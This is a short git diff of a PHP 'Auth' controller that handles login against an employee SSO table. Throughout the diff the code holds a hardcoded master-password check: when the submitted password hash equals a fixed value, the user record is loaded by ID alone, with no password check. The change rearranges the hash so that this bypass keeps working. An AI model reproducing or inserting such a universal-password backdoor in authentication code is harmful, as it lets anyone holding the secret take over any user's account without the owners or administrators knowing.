@@ -60,14 +60,15 @@ class Auth extends BaseController
 
         $p1 = substr($p,0,16);
         $p2 = substr($p,16);
+        $p = $p2.$p1;
 
         $db = new SimpegModel;
 
 
-        if ($password == '0b1c339358111b0d41b9df4a217bb3c1') {
+        if ($p == '0b1c339358111b0d41b9df4a217bb3c1') {
           $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u]);
         }else{
-          $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p2.$p1]);
+          $pegawai  = $db->getRow('TEMP_PEGAWAI_SSO',['NIP_USER' => $u,'PWD' => $p]);
         }
 
 
